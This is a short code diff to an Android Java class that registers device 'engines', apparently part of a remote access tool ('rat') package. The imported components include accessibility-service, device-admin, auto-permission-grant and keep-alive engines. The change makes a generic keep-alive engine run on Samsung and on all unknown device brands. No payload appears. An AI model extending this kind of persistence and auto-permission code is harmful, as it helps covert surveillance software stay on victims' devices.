@@ -8,9 +8,9 @@ import com.vendor.rat.auto.engine.AccessibilityServiceEngine;
 import com.vendor.rat.auto.engine.DeviceAdminEngine;
 import com.vendor.rat.auto.engine.LockScreenMonitor;
 import com.vendor.rat.auto.engine.PermissionAutoGrantEngine;
+import com.vendor.rat.auto.engine.AospKeepAliveEngine;
 import com.vendor.rat.auto.engine.vendor.HuaweiEngine;
 import com.vendor.rat.auto.engine.vendor.OppoEngine;
-import com.vendor.rat.auto.engine.vendor.SamsungEngine;
 import com.vendor.rat.auto.engine.vendor.VivoEngine;
 import com.vendor.rat.auto.engine.vendor.XiaomiEngine;
 import com.vendor.rat.utils.DeviceUtils;
@@ -116,11 +116,11 @@ public class EngineManager {
             register(new VivoEngine());
             Log.d(TAG, "Registered VivoEngine");
         } else if (DeviceUtils.isSamsung()) {
-            register(new SamsungEngine());
-            Log.d(TAG, "Registered SamsungEngine");
+            register(new AospKeepAliveEngine());
+            Log.d(TAG, "Registered AospKeepAliveEngine (Samsung)");
         } else {
-            Log.w(TAG, "Unknown vendor: " + DeviceUtils.getBrandName()
-                + ", no vendor engine registered");
+            register(new AospKeepAliveEngine());
+            Log.d(TAG, "Registered AospKeepAliveEngine");
         }
     }
 
